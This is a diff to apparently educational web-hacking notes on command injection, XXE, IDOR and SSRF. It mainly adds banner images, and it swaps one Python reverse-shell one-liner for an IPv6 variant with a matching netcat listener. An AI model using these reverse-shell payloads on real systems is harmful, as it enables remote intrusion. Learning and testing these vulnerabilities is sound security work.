@@ -5,6 +5,9 @@
 
 ## 🥇01. OS Command Injection :
 
+![command-injection-vulnerability](https://user-images.githubusercontent.com/55437834/116801682-d6c45080-ab2d-11eb-8c38-cae9126833af.jpg)
+
+
 ### What is OS Command Injection ?
 
 OS Command Injection is server side  web vulnerablities where attacker execute :eyes:" system command"  like id, whoami ,uname etc os command  .
@@ -34,11 +37,11 @@ Blind command injection occurs when the system command made to the server does n
 ### Example :
          
         ♥️  1. upload reverse shell :
-                                  ;  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+                                  ; python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
 
            2. listen reverse shell :
 
-                                 nc -lnvp 1234
+                                 nc -lnvp 4242
 
 Note : 
            
@@ -72,6 +75,9 @@ Use Of Sqlite3 :
                       
                 
 # 🥉03. XML OR XML External Entity OR XXE :
+
+![XXE-banner-1024x536-1-1024x536](https://user-images.githubusercontent.com/55437834/116801699-ff4c4a80-ab2d-11eb-80b6-af5d72d7ff85.jpg)
+
 
 An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data.
 
@@ -127,7 +133,10 @@ In a similar manner, we can use this kind of payload to read other files but a l
 
 # 🔊04.Broken Access -IDOR :
 
-###### IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.
+![116019462_282530606501791_5738413798267894160_n](https://user-images.githubusercontent.com/55437834/116801663-a977a280-ab2d-11eb-9b3d-b002ec8099e5.png)
+
+
+##### IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.
 
 For example, let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this https://example.com/bank?account_number=1234. On that page we can see all our important bank details, and a user would do whatever they needed to do and move along their way thinking nothing is wrong.
 
@@ -169,7 +178,7 @@ After analyzing  , we realize that  our target  website create by "Nostromo"  . 
 #### Command :
           download_file.py target_url  id 
 
-Here , you can use any linux os command instead of id
+Here , you can use any linux os command instead of id 
 
 # 🐞 SSRF(Sever Side Request Forgery ) :
 
@@ -243,4 +252,3 @@ On the other hand, whitelists mean that a server would only allow through reques
                3.https://pravinponnusamy.medium.com/ssrf-payloads-f09b2a86a8b4    (Bypass Payload List )
                         
 ### 😍Happy Hacking 😍
-
